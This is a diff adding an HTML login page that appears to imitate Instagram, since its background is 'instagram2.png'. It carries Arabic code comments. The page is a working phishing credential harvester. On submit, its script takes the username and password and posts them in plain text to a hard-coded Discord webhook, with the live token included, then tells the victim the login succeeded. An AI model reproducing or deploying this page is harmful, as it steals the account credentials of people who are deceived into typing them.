@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+         body {
+    font-family: Arial, sans-serif;
+    background-image: url('./instagram2.png');
+    background-size: cover; /* لتغطية الصفحة بالكامل بالصورة */
+    background-repeat: no-repeat; /* عدم تكرار الصورة */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 250px;
+        }
+
+        h2 {
+            color: #333;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        button {
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            width: 100%;
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login</h2>
+        <form id="login-form">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+
+            // استخراج قيم اسم المستخدم وكلمة المرور
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // إنشاء كائن لتخزين البيانات المراد إرسالها
+            var data = {
+                content: `Username: ${username}, Password: ${password}`
+            };
+
+            // إرسال البيانات إلى Webhook على Discord
+            fetch('https://discord.com/api/webhooks/1260965183535190146/UinzzbccpGN44HcJkhjEA0QHuUfdeXJxNxAAncDBH4z7GXxKUWEFjK6oRSQq4funYypd', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Response received from webhook:', data);
+                // يمكنك إضافة معالجة إضافية هنا بناءً على الاستجابة التي تم استلامها من الويبهوك
+                alert('Logged in successfully! Data sent to webhook.');
+            })
+            .catch(error => {
+                console.error('Error sending data to webhook:', error);
+                alert('An error occurred, please try again later.');
+            });
+        });
+    </script>
+</body>
+</html>
